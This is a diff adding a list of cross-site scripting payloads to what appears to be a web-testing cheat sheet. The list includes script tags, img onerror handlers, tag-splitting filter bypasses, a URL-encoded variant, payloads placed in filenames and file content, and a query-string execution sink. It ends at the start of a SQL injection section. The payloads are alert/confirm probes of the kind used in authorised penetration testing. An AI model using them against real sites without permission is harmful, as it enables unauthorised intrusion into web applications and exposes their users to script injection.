@@ -1,3 +1,34 @@
+##### Payload
+
+
+1.<script>alert(1)</script> 
+
+2.Balancing: abc@gmail.com<script>alert(1)</script>
+
+3.abc@gmail.com<script>alert(1)</script>
+
+4.demo"><img src=x onerror=confirm(1)>
+
+5."><img src=x onerror=confirm(1)>
+
+6.change variation: (i) "><img src="x" onerror=alert("helloworld")>
+
+                   (ii) "><scr<script>ipt>alert(1)</scr</script>ipt>
+
+7.url encode: demo%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
+
+8.filename: "><img src="x" onerror=alert("helloworld")>
+
+9.file content: <script>alert(1)</script>
+
+10.hi"><script>alert(1)</script>"/>
+
+11.  ?name=<img src=x onerror=alert(1)>
+
+execution sink: ?coin=alert(1)
+
+
+
 #### Generic SQL Injection Payloads
 
 ```
